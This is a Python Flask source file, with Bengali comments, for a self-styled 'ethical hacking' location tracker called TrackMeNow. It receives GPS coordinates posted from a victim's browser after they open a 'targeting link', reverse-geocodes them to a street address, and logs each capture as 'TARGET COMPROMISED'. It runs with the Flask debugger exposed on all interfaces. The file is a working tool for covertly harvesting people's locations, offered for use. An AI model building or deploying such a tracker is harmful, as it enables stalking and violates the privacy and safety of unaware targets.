import os
import sys
import subprocess
from flask import Flask, render_template, request, jsonify
from geopy.geocoders import Nominatim  # ঠিকানা বের করার লাইব্রেরি

app = Flask(__name__)

# Ethical Hacking Theme Colors (ANSI Escape Codes)
GREEN = '\033[92m'
RED = '\033[91m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
BOLD = '\033[1m'
RESET = '\033[0m'

# Initialize the Geolocator with a custom user-agent
geolocator = Nominatim(user_agent="trackmenow_osint")

def show_banner():
    if os.environ.get('WERKZEUG_RUN_MAIN') == 'true':
        os.system('clear' if os.name != 'nt' else 'cls')
    
    banner = r"""""" + f"""{GREEN}{BOLD}
======================================================================
  _______ _____          _____ _  ____  __ ______ _   _  ______          __
 |__   __|  __ \   /\   / ____| |/ /  \/  |  ____| \ | |/ __ \ \        / /
    | |  | |__) | /  \ | |    | ' /| \  / | |__  |  \| | |  | \ \  /\  / / 
    | |  |  _  / / /\ \| |    |  < | |\/| |  __| | . ` | |  | |\ \/  \/ /  
    | |  | | \ \/ ____ \ |____| . \| |  | | |____| |\  | |__| | \  /\  /   
    |_|  |_|  \_\_/    \_\_____|_|\_\_|  |_|______|_| \_|\____/   \/  \/    
                                                                           
         {CYAN}[+] Secure OSINT Location Tracking Engine v1.0.2 [+]
======================================================================{RESET}
    """
    print(banner)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/update_location', methods=['POST'])
def update_location():
    try:
        data = request.get_json()
        if not data:
            print(f"{RED}[-] Warning: Empty payload received.{RESET}")
            return jsonify({"status": "error", "message": "No data received"}), 400
        
        latitude = data.get('lat')
        longitude = data.get('lon')
        
        # 🎯 Reverse Geocoding: ল্যাটিচিউড থেকে আসল ঠিকানা বের করা
        try:
            location_details = geolocator.reverse(f"{latitude}, {longitude}", timeout=10)
            address = location_details.address if location_details else "Unknown Location Address"
        except Exception:
            address = "Failed to resolve address (Network Timeout)"
        
        # Live target telemetry logging (Now with Full Address Location)
        print(f"\n{GREEN}{BOLD}[🎯] TARGET COMPROMISED - NEW LOCATION CAPTURED!{RESET}")
        print(f"    {CYAN}LATITUDE  :{RESET} {YELLOW}{latitude}{RESET}")
        print(f"    {CYAN}LONGITUDE :{RESET} {YELLOW}{longitude}{RESET}")
        print(f"    {CYAN}ADDRESS   :{RESET} {GREEN}{BOLD}{address}{RESET}")  # এখানে আসল ঠিকানা দেখাবে
        print(f"    {CYAN}STATUS    :{RESET} {GREEN}Data successfully intercepted & parsed.{RESET}\n")
        
        return jsonify({"status": "success", "message": "Location updated"}), 200
        
    except Exception as e:
        print(f"{RED}[💥] Critical Error intercepting payload: {e}{RESET}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    cert_path = 'cert.pem'
    key_path = 'key.pem'
    if not (os.path.exists(cert_path) and os.path.exists(key_path)):
        if os.path.exists('generate_cert.sh'):
            subprocess.run(['bash', 'generate_cert.sh'])

    show_banner()
    
    if os.path.exists(cert_path) and os.path.exists(key_path):
        print(f"{CYAN}[*] Initializing SSL/TLS layer with self-signed certificates...{RESET}")
        print(f"{GREEN}[+] Framework status: ACTIVE and listening for incoming payloads...{RESET}")
        
        print(f"\n{GREEN}{BOLD}==========[ TARGETING LINKS ]=========={RESET}")
        print(f" {CYAN}LOCAL LOOPBACK :{RESET} {YELLOW}https://127.0.0.1:5000{RESET}")
        print(f" {CYAN}LAN CAPTURE IP :{RESET} {GREEN}{BOLD}https://100.73.179.109:5000{RESET}")
        print(f"{GREEN}{BOLD}======================================={RESET}")
        print(f"{CYAN}[*] Awaiting target interaction. Live logs will stream below...{RESET}\n")
        
        import flask.cli
        flask.cli.show_server_banner = lambda *x: None 
        
        app.run(
            host='0.0.0.0', 
            port=5000, 
            debug=True, 
            ssl_context=(cert_path, key_path)
        )
